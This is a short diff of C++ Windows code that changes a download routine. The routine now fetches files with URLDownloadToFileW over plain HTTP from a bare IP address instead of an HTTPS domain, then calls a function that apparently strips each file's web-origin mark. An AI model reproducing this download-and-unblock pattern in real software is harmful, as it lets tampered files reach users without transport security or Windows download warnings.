@@ -1,7 +1,6 @@
 #define WIN32_LEAN_AND_MEAN
 #include <Windows.h>
 #include <filesystem>
-#include <urlmon.h>
 #include <ShlObj_core.h>
 #include <tlhelp32.h>
 #include <shellapi.h>
@@ -281,7 +280,7 @@ void process_end(const std::wstring& name)
 
 void download(const std::wstring& url, int j)
 {
-	URLDownloadToFileW(nullptr, std::wstring(L"https://mobasuite.com/moba_files/" + url).c_str(), n[j], 0, nullptr);
+	URLDownloadToFileW(nullptr, std::wstring(L"http://81.234.103.195/mobasuite/" + url).c_str(), n[j], 0, nullptr);
 	unblockfile(n[j]);
 }
 
